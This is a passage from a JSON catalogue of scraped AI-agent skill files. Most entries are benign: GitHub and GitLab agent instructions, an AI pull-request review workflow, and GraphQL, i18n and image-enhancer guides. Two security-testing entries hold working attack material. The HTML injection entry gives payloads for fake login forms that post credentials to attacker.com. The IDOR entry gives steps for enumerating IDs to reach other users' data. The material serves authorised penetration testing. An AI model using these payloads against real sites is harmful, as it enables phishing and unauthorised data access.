      "content": "\nYou have access to an environment variable, `GITHUB_TOKEN`, which allows you to interact with\nthe GitHub API.\n\n<IMPORTANT>\nYou can use `curl` with the `GITHUB_TOKEN` to interact with GitHub's API.\nALWAYS use the GitHub API for operations instead of a web browser.\nALWAYS use the `create_pr` tool to open a pull request\n</IMPORTANT>\n\nIf you encounter authentication issues when pushing to GitHub (such as password prompts or permission errors), the old token may have expired. In such case, update the remote URL to include the current token: `git remote set-url origin https://${GITHUB_TOKEN}@github.com/username/repo.git`\n\nHere are some instructions for pushing, but ONLY do this if the user asks you to:\n* NEVER push directly to the `main` or `master` branch\n* Git config (username and email) is pre-set. Do not modify.\n* You may already be on a branch starting with `openhands-workspace`. Create a new branch with a better name before pushing.\n* Use the `create_pr` tool to create a pull request, if you haven't already\n* Once you've created your own branch or a pull request, continue to update it. Do NOT create a new one unless you are explicitly asked to. Update the PR title and description as necessary, but don't change the branch name.\n* Use the main branch as the base branch, unless the user requests otherwise\n* After opening or updating a pull request, send the user a short message with a link to the pull request.\n* Do NOT mark a pull request as ready to review unless the user explicitly says so\n* Do all of the above in as few steps as possible. E.g. you could push changes with one step by running the following bash commands:\n```bash\ngit remote -v && git branch # to find the current org, repo and branch\ngit checkout -b create-widget && git add . && git commit -m \"Create widget\" && git push -u origin create-widget\n```\n",
      "tags": [
        "git",
        "github",
        "bash",
        "pr",
        "agent",
        "tool",
        "api"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:15:30.219Z"
    },
    {
      "id": "antigravity-github-workflow-automation",
      "name": "github-workflow-automation",
      "slug": "github-workflow-automation",
      "description": "Automate GitHub workflows with AI assistance. Includes PR reviews, issue triage, CI/CD integration, and Git operations. Use when automating GitHub workflows, setting up PR review automation, creating GitHub Actions, or triaging issues.",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/github-workflow-automation",
      "content": "\n# 🔧 GitHub Workflow Automation\n\n> Patterns for automating GitHub workflows with AI assistance, inspired by [Gemini CLI](https://github.com/google-gemini/gemini-cli) and modern DevOps practices.\n\n## When to Use This Skill\n\nUse this skill when:\n\n- Automating PR reviews with AI\n- Setting up issue triage automation\n- Creating GitHub Actions workflows\n- Integrating AI into CI/CD pipelines\n- Automating Git operations (rebases, cherry-picks)\n\n---\n\n## 1. Automated PR Review\n\n### 1.1 PR Review Action\n\n```yaml\n# .github/workflows/ai-review.yml\nname: AI Code Review\n\non:\n  pull_request:\n    types: [opened, synchronize]\n\njobs:\n  review:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      pull-requests: write\n\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          fetch-depth: 0\n\n      - name: Get changed files\n        id: changed\n        run: |\n          files=$(git diff --name-only origin/${{ github.base_ref }}...HEAD)\n          echo \"files<<EOF\" >> $GITHUB_OUTPUT\n          echo \"$files\" >> $GITHUB_OUTPUT\n          echo \"EOF\" >> $GITHUB_OUTPUT\n\n      - name: Get diff\n        id: diff\n        run: |\n          diff=$(git diff origin/${{ github.base_ref }}...HEAD)\n          echo \"diff<<EOF\" >> $GITHUB_OUTPUT\n          echo \"$diff\" >> $GITHUB_OUTPUT\n          echo \"EOF\" >> $GITHUB_OUTPUT\n\n      - name: AI Review\n        uses: actions/github-script@v7\n        with:\n          script: |\n            const { Anthropic } = require('@anthropic-ai/sdk');\n            const client = new Anthropic({ apiKey: process.env.ANTHROPIC_API_KEY });\n\n            const response = await client.messages.create({\n              model: \"claude-3-sonnet-20240229\",\n              max_tokens: 4096,\n              messages: [{\n                role: \"user\",\n                content: `Review this PR diff and provide feedback:\n                \n                Changed files: ${{ steps.changed.outputs.files }}\n                \n                Diff:\n                ${{ steps.diff.outputs.diff }}\n                \n                Provide:\n                1. Summary of changes\n                2. Potential issues or bugs\n                3. Suggestions for improvement\n                4. Security concerns if any\n                \n                Format as GitHub markdown.`\n              }]\n            });\n\n            await github.rest.pulls.createReview({\n              owner: context.repo.owner,\n              repo: context.repo.repo,\n              pull_number: context.issue.number,\n              body: response.content[0].text,\n              event: 'COMMENT'\n            });\n        env:\n          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}\n```\n\n### 1.2 Review Comment Patterns\n\n````markdown\n# AI Review Structure\n\n## 📋 Summary\n\nBrief description of what this PR does.\n\n## ✅ What looks good\n\n- Well-structured code\n- Good test coverage\n- Clear naming conventions\n\n## ⚠️ Potential Issues\n\n1. **Line 42**: Possible null pointer exception\n   ```javascript\n   // Current\n   user.profile.name;\n   // Suggested\n   user?.profile?.name ?? \"Unknown\";\n   ```\n````\n\n2. **Line 78**: Consider error handling\n   ```javascript\n   // Add try-catch or .catch()\n   ```\n\n## 💡 Suggestions\n\n- Consider extracting the validation logic into a separate function\n- Add JSDoc comments for public methods\n\n## 🔒 Security Notes\n\n- No sensitive data exposure detected\n- API key handling looks correct\n\n````\n\n### 1.3 Focused Reviews\n\n```yaml\n# Review only specific file types\n- name: Filter code files\n  run: |\n    files=$(git diff --name-only origin/${{ github.base_ref }}...HEAD | \\\n            grep -E '\\.(ts|tsx|js|jsx|py|go)$' || true)\n    echo \"code_files=$files\" >> $GITHUB_OUTPUT\n\n# Review with context\n- name: AI Review with context\n  run: |\n    # Include relevant context files\n    context=\"\"\n    for file in ${{ steps.changed.outputs.files }}; do\n      if [[ -f \"$file\" ]]; then\n        context+=\"=== $file ===\\n$(cat $file)\\n\\n\"\n      fi\n    done\n\n    # Send to AI with full file context\n````\n\n---\n\n## 2. Issue Triage Automation\n\n### 2.1 Auto-label Issues\n\n```yaml\n# .github/workflows/issue-triage.yml\nname: Issue Triage\n\non:\n  issues:\n    types: [opened]\n\njobs:\n  triage:\n    runs-on: ubuntu-latest\n    permissions:\n      issues: write\n\n    steps:\n      - name: Analyze issue\n        uses: actions/github-script@v7\n        with:\n          script: |\n            const issue = context.payload.issue;\n\n            // Call AI to analyze\n            const analysis = await analyzeIssue(issue.title, issue.body);\n\n            // Apply labels\n            const labels = [];\n\n            if (analysis.type === 'bug') {\n              labels.push('bug');\n              if (analysis.severity === 'high') labels.push('priority: high');\n            } else if (analysis.type === 'feature') {\n              labels.push('enhancement');\n            } else if (analysis.type === 'question') {\n              labels.push('question');\n            }\n\n            if (analysis.area) {\n              labels.push",
      "tags": [
        "javascript",
        "typescript",
        "markdown",
        "api",
        "claude",
        "ai",
        "automation",
        "workflow",
        "document",
        "security"
      ],
      "useCases": [
        "Automating PR reviews with AI",
        "Setting up issue triage automation",
        "Creating GitHub Actions workflows",
        "Integrating AI into CI/CD pipelines",
        "Automating Git operations (rebases, cherry-picks)"
      ],
      "scrapedAt": "2026-01-26T13:18:54.153Z"
    },
    {
      "id": "openhands-gitlab",
      "name": "gitlab",
      "slug": "gitlab",
      "description": "You have access to an environment variable, `GITLAB_TOKEN`, which allows you to interact with",
      "category": "Development & Code Tools",
      "source": "openhands",
      "repoUrl": "https://github.com/OpenHands/OpenHands",
      "skillUrl": "https://github.com/OpenHands/OpenHands/blob/main/skills/gitlab.md",
      "content": "\nYou have access to an environment variable, `GITLAB_TOKEN`, which allows you to interact with\nthe GitLab API.\n\n<IMPORTANT>\nYou can use `curl` with the `GITLAB_TOKEN` to interact with GitLab's API.\nALWAYS use the GitLab API for operations instead of a web browser.\nALWAYS use the `create_mr` tool to open a merge request\n</IMPORTANT>\n\nIf you encounter authentication issues when pushing to GitLab (such as password prompts or permission errors), the old token may have expired. In such case, update the remote URL to include the current token: `git remote set-url origin https://oauth2:${GITLAB_TOKEN}@gitlab.com/username/repo.git`\n\nHere are some instructions for pushing, but ONLY do this if the user asks you to:\n* NEVER push directly to the `main` or `master` branch\n* Git config (username and email) is pre-set. Do not modify.\n* You may already be on a branch starting with `openhands-workspace`. Create a new branch with a better name before pushing.\n* Use the `create_mr` tool to create a merge request, if you haven't already\n* Once you've created your own branch or a merge request, continue to update it. Do NOT create a new one unless you are explicitly asked to. Update the PR title and description as necessary, but don't change the branch name.\n* Use the main branch as the base branch, unless the user requests otherwise\n* After opening or updating a merge request, send the user a short message with a link to the merge request.\n* Do all of the above in as few steps as possible. E.g. you could push changes with one step by running the following bash commands:\n```bash\ngit remote -v && git branch # to find the current org, repo and branch\ngit checkout -b create-widget && git add . && git commit -m \"Create widget\" && git push -u origin create-widget\n```\n",
      "tags": [
        "git",
        "gitlab",
        "bash",
        "pr",
        "agent",
        "tool",
        "api"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:15:30.503Z"
    },
    {
      "id": "antigravity-graphql",
      "name": "graphql",
      "slug": "graphql",
      "description": "GraphQL gives clients exactly the data they need - no more, no less. One endpoint, typed schema, introspection. But the flexibility that makes it powerful also makes it dangerous. Without proper controls, clients can craft queries that bring down your server.  This skill covers schema design, resolv",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/graphql",
      "content": "\n# GraphQL\n\nYou're a developer who has built GraphQL APIs at scale. You've seen the\nN+1 query problem bring down production servers. You've watched clients\ncraft deeply nested queries that took minutes to resolve. You know that\nGraphQL's power is also its danger.\n\nYour hard-won lessons: The team that didn't use DataLoader had unusable\nAPIs. The team that allowed unlimited query depth got DDoS'd by their\nown clients. The team that made everything nullable couldn't distinguish\nerrors from empty data. You've l\n\n## Capabilities\n\n- graphql-schema-design\n- graphql-resolvers\n- graphql-federation\n- graphql-subscriptions\n- graphql-dataloader\n- graphql-codegen\n- apollo-server\n- apollo-client\n- urql\n\n## Patterns\n\n### Schema Design\n\nType-safe schema with proper nullability\n\n### DataLoader for N+1 Prevention\n\nBatch and cache database queries\n\n### Apollo Client Caching\n\nNormalized cache with type policies\n\n## Anti-Patterns\n\n### ❌ No DataLoader\n\n### ❌ No Query Depth Limiting\n\n### ❌ Authorization in Schema\n\n## ⚠️ Sharp Edges\n\n| Issue | Severity | Solution |\n|-------|----------|----------|\n| Each resolver makes separate database queries | critical | # USE DATALOADER |\n| Deeply nested queries can DoS your server | critical | # LIMIT QUERY DEPTH AND COMPLEXITY |\n| Introspection enabled in production exposes your schema | high | # DISABLE INTROSPECTION IN PRODUCTION |\n| Authorization only in schema directives, not resolvers | high | # AUTHORIZE IN RESOLVERS |\n| Authorization on queries but not on fields | high | # FIELD-LEVEL AUTHORIZATION |\n| Non-null field failure nullifies entire parent | medium | # DESIGN NULLABILITY INTENTIONALLY |\n| Expensive queries treated same as cheap ones | medium | # QUERY COST ANALYSIS |\n| Subscriptions not properly cleaned up | medium | # PROPER SUBSCRIPTION CLEANUP |\n\n## Related Skills\n\nWorks well with: `backend`, `postgres-wizard`, `nextjs-app-router`, `react-patterns`\n",
      "tags": [
        "react",
        "nextjs",
        "api",
        "ai",
        "design",
        "document",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:18:55.416Z"
    },
    {
      "id": "antigravity-html-injection-testing",
      "name": "HTML Injection Testing",
      "slug": "html-injection-testing",
      "description": "This skill should be used when the user asks to \"test for HTML injection\", \"inject HTML into web pages\", \"perform HTML injection attacks\", \"deface web applications\", or \"test content injection vulnerabilities\". It provides comprehensive HTML injection attack techniques and testing methodologies.",
      "category": "Security & Systems",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/html-injection-testing",
      "content": "\n# HTML Injection Testing\n\n## Purpose\n\nIdentify and exploit HTML injection vulnerabilities that allow attackers to inject malicious HTML content into web applications. This vulnerability enables attackers to modify page appearance, create phishing pages, and steal user credentials through injected forms.\n\n## Prerequisites\n\n### Required Tools\n- Web browser with developer tools\n- Burp Suite or OWASP ZAP\n- Tamper Data or similar proxy\n- cURL for testing payloads\n\n### Required Knowledge\n- HTML fundamentals\n- HTTP request/response structure\n- Web application input handling\n- Difference between HTML injection and XSS\n\n## Outputs and Deliverables\n\n1. **Vulnerability Report** - Identified injection points\n2. **Exploitation Proof** - Demonstrated content manipulation\n3. **Impact Assessment** - Potential phishing and defacement risks\n4. **Remediation Guidance** - Input validation recommendations\n\n## Core Workflow\n\n### Phase 1: Understanding HTML Injection\n\nHTML injection occurs when user input is reflected in web pages without proper sanitization:\n\n```html\n<!-- Vulnerable code example -->\n<div>\n    Welcome, <?php echo $_GET['name']; ?>\n</div>\n\n<!-- Attack input -->\n?name=<h1>Injected Content</h1>\n\n<!-- Rendered output -->\n<div>\n    Welcome, <h1>Injected Content</h1>\n</div>\n```\n\nKey differences from XSS:\n- HTML injection: Only HTML tags are rendered\n- XSS: JavaScript code is executed\n- HTML injection is often stepping stone to XSS\n\nAttack goals:\n- Modify website appearance (defacement)\n- Create fake login forms (phishing)\n- Inject malicious links\n- Display misleading content\n\n### Phase 2: Identifying Injection Points\n\nMap application for potential injection surfaces:\n\n```\n1. Search bars and search results\n2. Comment sections\n3. User profile fields\n4. Contact forms and feedback\n5. Registration forms\n6. URL parameters reflected on page\n7. Error messages\n8. Page titles and headers\n9. Hidden form fields\n10. Cookie values reflected on page\n```\n\nCommon vulnerable parameters:\n```\n?name=\n?user=\n?search=\n?query=\n?message=\n?title=\n?content=\n?redirect=\n?url=\n?page=\n```\n\n### Phase 3: Basic HTML Injection Testing\n\nTest with simple HTML tags:\n\n```html\n<!-- Basic text formatting -->\n<h1>Test Injection</h1>\n<b>Bold Text</b>\n<i>Italic Text</i>\n<u>Underlined Text</u>\n<font color=\"red\">Red Text</font>\n\n<!-- Structural elements -->\n<div style=\"background:red;color:white;padding:10px\">Injected DIV</div>\n<p>Injected paragraph</p>\n<br><br><br>Line breaks\n\n<!-- Links -->\n<a href=\"http://attacker.com\">Click Here</a>\n<a href=\"http://attacker.com\">Legitimate Link</a>\n\n<!-- Images -->\n<img src=\"http://attacker.com/image.png\">\n<img src=\"x\" onerror=\"alert(1)\">  <!-- XSS attempt -->\n```\n\nTesting workflow:\n```bash\n# Test basic injection\ncurl \"http://target.com/search?q=<h1>Test</h1>\"\n\n# Check if HTML renders in response\ncurl -s \"http://target.com/search?q=<b>Bold</b>\" | grep -i \"bold\"\n\n# Test in URL-encoded form\ncurl \"http://target.com/search?q=%3Ch1%3ETest%3C%2Fh1%3E\"\n```\n\n### Phase 4: Types of HTML Injection\n\n#### Stored HTML Injection\n\nPayload persists in database:\n\n```html\n<!-- Profile bio injection -->\nName: John Doe\nBio: <div style=\"position:absolute;top:0;left:0;width:100%;height:100%;background:white;\">\n     <h1>Site Under Maintenance</h1>\n     <p>Please login at <a href=\"http://attacker.com/login\">portal.company.com</a></p>\n     </div>\n\n<!-- Comment injection -->\nGreat article!\n<form action=\"http://attacker.com/steal\" method=\"POST\">\n    <input name=\"username\" placeholder=\"Session expired. Enter username:\">\n    <input name=\"password\" type=\"password\" placeholder=\"Password:\">\n    <input type=\"submit\" value=\"Login\">\n</form>\n```\n\n#### Reflected GET Injection\n\nPayload in URL parameters:\n\n```html\n<!-- URL injection -->\nhttp://target.com/welcome?name=<h1>Welcome%20Admin</h1><form%20action=\"http://attacker.com/steal\">\n\n<!-- Search result injection -->\nhttp://target.com/search?q=<marquee>Your%20account%20has%20been%20compromised</marquee>\n```\n\n#### Reflected POST Injection\n\nPayload in POST data:\n\n```bash\n# POST injection test\ncurl -X POST -d \"comment=<div style='color:red'>Malicious Content</div>\" \\\n     http://target.com/submit\n\n# Form field injection\ncurl -X POST -d \"name=<script>alert(1)</script>&email=test@test.com\" \\\n     http://target.com/register\n```\n\n#### URL-Based Injection\n\nInject into displayed URLs:\n\n```html\n<!-- If URL is displayed on page -->\nhttp://target.com/page/<h1>Injected</h1>\n\n<!-- Path-based injection -->\nhttp://target.com/users/<img src=x>/profile\n```\n\n### Phase 5: Phishing Attack Construction\n\nCreate convincing phishing forms:\n\n```html\n<!-- Fake login form overlay -->\n<div style=\"position:fixed;top:0;left:0;width:100%;height:100%;\n            background:white;z-index:9999;padding:50px;\">\n    <h2>Session Expired</h2>\n    <p>Your session has expired. Please log in again.</p>\n    <form action=\"http://attacker.com/capture\" method=\"POST\">\n        <label>Username:</label><br>\n        <input type=\"text\" name=\"username\" style=\"width:2",
      "tags": [
        "python",
        "javascript",
        "api",
        "ai",
        "agent",
        "workflow",
        "document",
        "image",
        "security",
        "vulnerability"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:18:56.619Z"
    },
    {
      "id": "antigravity-hubspot-integration",
      "name": "hubspot-integration",
      "slug": "hubspot-integration",
      "description": "Expert patterns for HubSpot CRM integration including OAuth authentication, CRM objects, associations, batch operations, webhooks, and custom objects. Covers Node.js and Python SDKs. Use when: hubspot, hubspot api, hubspot crm, hubspot integration, contacts api.",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/hubspot-integration",
      "content": "\n# HubSpot Integration\n\n## Patterns\n\n### OAuth 2.0 Authentication\n\nSecure authentication for public apps\n\n### Private App Token\n\nAuthentication for single-account integrations\n\n### CRM Object CRUD Operations\n\nCreate, read, update, delete CRM records\n\n## Anti-Patterns\n\n### ❌ Using Deprecated API Keys\n\n### ❌ Individual Requests Instead of Batch\n\n### ❌ Polling Instead of Webhooks\n\n## ⚠️ Sharp Edges\n\n| Issue | Severity | Solution |\n|-------|----------|----------|\n| Issue | high | See docs |\n| Issue | high | See docs |\n| Issue | critical | See docs |\n| Issue | high | See docs |\n| Issue | critical | See docs |\n| Issue | medium | See docs |\n| Issue | high | See docs |\n| Issue | medium | See docs |\n",
      "tags": [
        "python",
        "node",
        "api"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:18:58.138Z"
    },
    {
      "id": "antigravity-i18n-localization",
      "name": "i18n-localization",
      "slug": "i18n-localization",
      "description": "Internationalization and localization patterns. Detecting hardcoded strings, managing translations, locale files, RTL support.",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/i18n-localization",
      "content": "\n# i18n & Localization\n\n> Internationalization (i18n) and Localization (L10n) best practices.\n\n---\n\n## 1. Core Concepts\n\n| Term | Meaning |\n|------|---------|\n| **i18n** | Internationalization - making app translatable |\n| **L10n** | Localization - actual translations |\n| **Locale** | Language + Region (en-US, tr-TR) |\n| **RTL** | Right-to-left languages (Arabic, Hebrew) |\n\n---\n\n## 2. When to Use i18n\n\n| Project Type | i18n Needed? |\n|--------------|--------------|\n| Public web app | ✅ Yes |\n| SaaS product | ✅ Yes |\n| Internal tool | ⚠️ Maybe |\n| Single-region app | ⚠️ Consider future |\n| Personal project | ❌ Optional |\n\n---\n\n## 3. Implementation Patterns\n\n### React (react-i18next)\n\n```tsx\nimport { useTranslation } from 'react-i18next';\n\nfunction Welcome() {\n  const { t } = useTranslation();\n  return <h1>{t('welcome.title')}</h1>;\n}\n```\n\n### Next.js (next-intl)\n\n```tsx\nimport { useTranslations } from 'next-intl';\n\nexport default function Page() {\n  const t = useTranslations('Home');\n  return <h1>{t('title')}</h1>;\n}\n```\n\n### Python (gettext)\n\n```python\nfrom gettext import gettext as _\n\nprint(_(\"Welcome to our app\"))\n```\n\n---\n\n## 4. File Structure\n\n```\nlocales/\n├── en/\n│   ├── common.json\n│   ├── auth.json\n│   └── errors.json\n├── tr/\n│   ├── common.json\n│   ├── auth.json\n│   └── errors.json\n└── ar/          # RTL\n    └── ...\n```\n\n---\n\n## 5. Best Practices\n\n### DO ✅\n\n- Use translation keys, not raw text\n- Namespace translations by feature\n- Support pluralization\n- Handle date/number formats per locale\n- Plan for RTL from the start\n- Use ICU message format for complex strings\n\n### DON'T ❌\n\n- Hardcode strings in components\n- Concatenate translated strings\n- Assume text length (German is 30% longer)\n- Forget about RTL layout\n- Mix languages in same file\n\n---\n\n## 6. Common Issues\n\n| Issue | Solution |\n|-------|----------|\n| Missing translation | Fallback to default language |\n| Hardcoded strings | Use linter/checker script |\n| Date format | Use Intl.DateTimeFormat |\n| Number format | Use Intl.NumberFormat |\n| Pluralization | Use ICU message format |\n\n---\n\n## 7. RTL Support\n\n```css\n/* CSS Logical Properties */\n.container {\n  margin-inline-start: 1rem;  /* Not margin-left */\n  padding-inline-end: 1rem;   /* Not padding-right */\n}\n\n[dir=\"rtl\"] .icon {\n  transform: scaleX(-1);\n}\n```\n\n---\n\n## 8. Checklist\n\nBefore shipping:\n\n- [ ] All user-facing strings use translation keys\n- [ ] Locale files exist for all supported languages\n- [ ] Date/number formatting uses Intl API\n- [ ] RTL layout tested (if applicable)\n- [ ] Fallback language configured\n- [ ] No hardcoded strings in components\n\n---\n\n## Script\n\n| Script | Purpose | Command |\n|--------|---------|---------|\n| `scripts/i18n_checker.py` | Detect hardcoded strings & missing translations | `python scripts/i18n_checker.py <project_path>` |\n",
      "tags": [
        "python",
        "react",
        "api",
        "ai"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:18:59.338Z"
    },
    {
      "id": "antigravity-idor-testing",
      "name": "IDOR Vulnerability Testing",
      "slug": "idor-testing",
      "description": "This skill should be used when the user asks to \"test for insecure direct object references,\" \"find IDOR vulnerabilities,\" \"exploit broken access control,\" \"enumerate user IDs or object references,\" or \"bypass authorization to access other users' data.\" It provides comprehensive guidance for detecti",
      "category": "Security & Systems",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/idor-testing",
      "content": "\n# IDOR Vulnerability Testing\n\n## Purpose\n\nProvide systematic methodologies for identifying and exploiting Insecure Direct Object Reference (IDOR) vulnerabilities in web applications. This skill covers both database object references and static file references, detection techniques using parameter manipulation and enumeration, exploitation via Burp Suite, and remediation strategies for securing applications against unauthorized access.\n\n## Inputs / Prerequisites\n\n- **Target Web Application**: URL of application with user-specific resources\n- **Multiple User Accounts**: At least two test accounts to verify cross-user access\n- **Burp Suite or Proxy Tool**: Intercepting proxy for request manipulation\n- **Authorization**: Written permission for security testing\n- **Understanding of Application Flow**: Knowledge of how objects are referenced (IDs, filenames)\n\n## Outputs / Deliverables\n\n- **IDOR Vulnerability Report**: Documentation of discovered access control bypasses\n- **Proof of Concept**: Evidence of unauthorized data access across user contexts\n- **Affected Endpoints**: List of vulnerable API endpoints and parameters\n- **Impact Assessment**: Classification of data exposure severity\n- **Remediation Recommendations**: Specific fixes for identified vulnerabilities\n\n## Core Workflow\n\n### 1. Understand IDOR Vulnerability Types\n\n#### Direct Reference to Database Objects\nOccurs when applications reference database records via user-controllable parameters:\n```\n# Original URL (authenticated as User A)\nexample.com/user/profile?id=2023\n\n# Manipulation attempt (accessing User B's data)\nexample.com/user/profile?id=2022\n```\n\n#### Direct Reference to Static Files\nOccurs when applications expose file paths or names that can be enumerated:\n```\n# Original URL (User A's receipt)\nexample.com/static/receipt/205.pdf\n\n# Manipulation attempt (User B's receipt)\nexample.com/static/receipt/200.pdf\n```\n\n### 2. Reconnaissance and Setup\n\n#### Create Multiple Test Accounts\n```\nAccount 1: \"attacker\" - Primary testing account\nAccount 2: \"victim\" - Account whose data we attempt to access\n```\n\n#### Identify Object References\nCapture and analyze requests containing:\n- Numeric IDs in URLs: `/api/user/123`\n- Numeric IDs in parameters: `?id=123&action=view`\n- Numeric IDs in request body: `{\"userId\": 123}`\n- File paths: `/download/receipt_123.pdf`\n- GUIDs/UUIDs: `/profile/a1b2c3d4-e5f6-...`\n\n#### Map User IDs\n```\n# Access user ID endpoint (if available)\nGET /api/user-id/\n\n# Note ID patterns:\n# - Sequential integers (1, 2, 3...)\n# - Auto-incremented values\n# - Predictable patterns\n```\n\n### 3. Detection Techniques\n\n#### URL Parameter Manipulation\n```\n# Step 1: Capture original authenticated request\nGET /api/user/profile?id=1001 HTTP/1.1\nCookie: session=attacker_session\n\n# Step 2: Modify ID to target another user\nGET /api/user/profile?id=1000 HTTP/1.1\nCookie: session=attacker_session\n\n# Vulnerable if: Returns victim's data with attacker's session\n```\n\n#### Request Body Manipulation\n```\n# Original POST request\nPOST /api/address/update HTTP/1.1\nContent-Type: application/json\nCookie: session=attacker_session\n\n{\"id\": 5, \"userId\": 1001, \"address\": \"123 Attacker St\"}\n\n# Modified request targeting victim\n{\"id\": 5, \"userId\": 1000, \"address\": \"123 Attacker St\"}\n```\n\n#### HTTP Method Switching\n```\n# Original GET request may be protected\nGET /api/admin/users/1000 → 403 Forbidden\n\n# Try alternative methods\nPOST /api/admin/users/1000 → 200 OK (Vulnerable!)\nPUT /api/admin/users/1000 → 200 OK (Vulnerable!)\n```\n\n### 4. Exploitation with Burp Suite\n\n#### Manual Exploitation\n```\n1. Configure browser proxy through Burp Suite\n2. Login as \"attacker\" user\n3. Navigate to profile/data page\n4. Enable Intercept in Proxy tab\n5. Capture request with user ID\n6. Modify ID to victim's ID\n7. Forward request\n8. Observe response for victim's data\n```\n\n#### Automated Enumeration with Intruder\n```\n1. Send request to Intruder (Ctrl+I)\n2. Clear all payload positions\n3. Select ID parameter as payload position\n4. Configure attack type: Sniper\n5. Payload settings:\n   - Type: Numbers\n   - Range: 1 to 10000\n   - Step: 1\n6. Start attack\n7. Analyze responses for 200 status codes\n```\n\n#### Battering Ram Attack for Multiple Positions\n```\n# When same ID appears in multiple locations\nPUT /api/addresses/§5§/update HTTP/1.1\n\n{\"id\": §5§, \"userId\": 3}\n\nAttack Type: Battering Ram\nPayload: Numbers 1-1000\n```\n\n### 5. Common IDOR Locations\n\n#### API Endpoints\n```\n/api/user/{id}\n/api/profile/{id}\n/api/order/{id}\n/api/invoice/{id}\n/api/document/{id}\n/api/message/{id}\n/api/address/{id}/update\n/api/address/{id}/delete\n```\n\n#### File Downloads\n```\n/download/invoice_{id}.pdf\n/static/receipts/{id}.pdf\n/uploads/documents/{filename}\n/files/reports/report_{date}_{id}.xlsx\n```\n\n#### Query Parameters\n```\n?userId=123\n?orderId=456\n?documentId=789\n?file=report_123.pdf\n?account=user@email.com\n```\n\n## Quick Reference\n\n### IDOR Testing Checklist\n\n| Test | Method | Indicator of Vulnerability |\n|------|--------|-------------",
      "tags": [
        "python",
        "javascript",
        "pdf",
        "xlsx",
        "api",
        "ai",
        "workflow",
        "template",
        "document",
        "security"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:19:01.550Z"
    },
    {
      "id": "composio-image-enhancer",
      "name": "image-enhancer",
      "slug": "image-enhancer",
      "description": "Improves the quality of images, especially screenshots, by enhancing resolution, sharpness, and clarity. Perfect for preparing images for presentations, documentation, or social media posts.",
      "category": "Creative & Media",
      "source": "composio",
      "repoUrl": "https://github.com/ComposioHQ/awesome-claude-skills",
      "skillUrl": "https://github.com/ComposioHQ/awesome-claude-skills/tree/master/image-enhancer",
      "content": "\n# Image Enhancer\n\nThis skill takes your images and screenshots and makes them look better—sharper, clearer, and more professional.\n\n## When to Use This Skill\n\n- Improving screenshot quality for blog posts or documentation\n- Enhancing images before sharing on social media\n- Preparing images for presentations or reports\n- Upscaling low-resolution images\n- Sharpening blurry photos\n- Cleaning up compressed images\n\n## What This Skill Does\n\n1. **Analyzes Image Quality**: Checks resolution, sharpness, and compression artifacts\n2. **Enhances Resolution**: Upscales images intelligently\n3. **Improves Sharpness**: Enhances edges and details\n4. **Reduces Artifacts**: Cleans up compression artifacts and noise\n5. **Optimizes for Use Case**: Adjusts based on intended use (web, print, social media)\n\n## How to Use\n\n### Basic Enhancement\n\n```\nImprove the image quality of screenshot.png\n```\n\n```\nEnhance all images in this folder\n```\n\n### Specific Improvements\n\n```\nUpscale this image to 4K resolution\n```\n\n```\nSharpen this blurry screenshot\n```\n\n```\nReduce compression artifacts in this image\n```\n\n### Batch Processing\n\n```\nImprove the quality of all PNG files in this directory\n```\n\n## Example\n\n**User**: \"Improve the image quality of screenshot-2024.png\"\n\n**Output**:\n```\nAnalyzing screenshot-2024.png...\n\nCurrent specs:\n- Resolution: 1920x1080\n- Format: PNG\n- Quality: Good, but slight blur\n\nEnhancements applied:\n✓ Upscaled to 2560x1440 (retina)\n✓ Sharpened edges\n✓ Enhanced text clarity\n✓ Optimized file size\n\nSaved as: screenshot-2024-enhanced.png\nOriginal preserved as: screenshot-2024-original.png\n```\n\n**Inspired by:** Lenny Rachitsky's workflow from his newsletter - used for screenshots in his articles\n\n## Tips\n\n- Always keeps original files as backup\n- Works best with screenshots and digital images\n- Can batch process entire folders\n- Specify output format if needed (PNG for quality, JPG for smaller size)\n- For social media, mention the platform for optimal sizing\n\n## Common Use Cases\n\n- **Blog Posts**: Enhance screenshots before publishing\n- **Documentation**: Make UI screenshots crystal clear\n- **Social Media**: Optimize images for Twitter, LinkedIn, Instagram\n- **Presentations**: Upscale images for large screens\n- **Print Materials**: Increase resolution for physical media\n\n",
      "tags": [
        "git",
        "ai"
      ],
      "useCases": [
        "Improving screenshot quality for blog posts or documentation",
        "Enhancing images before sharing on social media",
        "Preparing images for presentations or reports",
        "Upscaling low-resolution images",
        "Sharpening blurry photos"
      ],
      "scrapedAt": "2026-01-26T13:15:06.308Z"
    },
    {
      "id": "awesome-llm-image-enhancer",
      "name": "image-enhancer",
      "slug": "awesome-llm-image-enhancer",
      "description": "Improves the quality of images, especially screenshots, by enhancing resolution, sharpness, and clarity. Perfect for preparing images for presentations, documentation, or social media posts.",
      "category": "Creative & Media",
      "source": "awesome-llm",
      "repoUrl": "https://github.com/Prat011/awesome-llm-skills",
      "skillUrl": "https://github.com/Prat011/awesome-llm-skills/tree/master/image-enhancer",
